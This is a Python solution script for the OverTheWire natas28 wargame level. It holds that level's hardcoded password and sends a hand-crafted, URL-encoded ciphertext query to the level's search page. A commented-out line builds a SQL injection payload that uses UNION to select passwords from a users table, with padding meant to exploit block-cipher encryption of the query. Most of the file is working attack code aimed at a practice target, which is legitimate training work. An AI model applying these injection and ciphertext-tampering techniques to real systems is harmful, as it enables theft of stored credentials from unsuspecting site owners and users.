#!/usr/bin/env python3

import requests, string
import base64
from requests.auth import HTTPBasicAuth
from urllib.parse import unquote

uri = 'http://natas28.natas.labs.overthewire.org/search.php'
username = 'natas28'
password = 'JWwR438wkgTsNKBbcJoowyysdM82YjeF'

chars = ''.join([string.digits, string.ascii_letters])

q = 'G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjP%2BBS%2F9pc8w2qC%2BE%2BBLksZLnOKX%2FtKRQAkZ3UXWuWWu9bzTfM5xp7c4R9mULvO1icC'
q2 = 'G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPaJVX7bAcwqZXM9uUTxYlTIwR8Wnw2MK57yc5ARA14rBI6UIv1MRoBmli0v6rbKYZp3PzGFCUqgFAjx%2BX0DfThWeMV3Pswo%2BHDk9OvGyAcKQ%3D'

# params = '&'.join(['%s=%s' % (k, v) for k, v in Data.items()])
# print(params)
# for i in range(32):
# Data = {'query' : "a"*9 + "'" + " UNION (SELECT password from users)#" + "a"*i}
    # p = requests.post( uri,
    #         auth=HTTPBasicAuth(username, password),
    #         params = Data)
p = requests.get( uri,
        auth=HTTPBasicAuth(username, password),
        params = q2)
    # query =  p.url.split('=')[1]
    # print( query )
    # json = '{' + ', '.join(['%s : %s' % (k, v) for k, v in Data.items()]) + '}'
    # json = "a*" + str(i)
print( '\n'.join( p.text.split('\r\n')[13:]) )

# f = open('./query.txt')
# lines = [line.rstrip('\n') for line in f]
# query = [k.split('\t') for k in lines]
# queries = [''.join([v[2],v[3],v[4]]) for v in query]
# f.close()

# for q in queries:
#     print( base64.b64decode(unquote(q).decode('utf8')) ) 



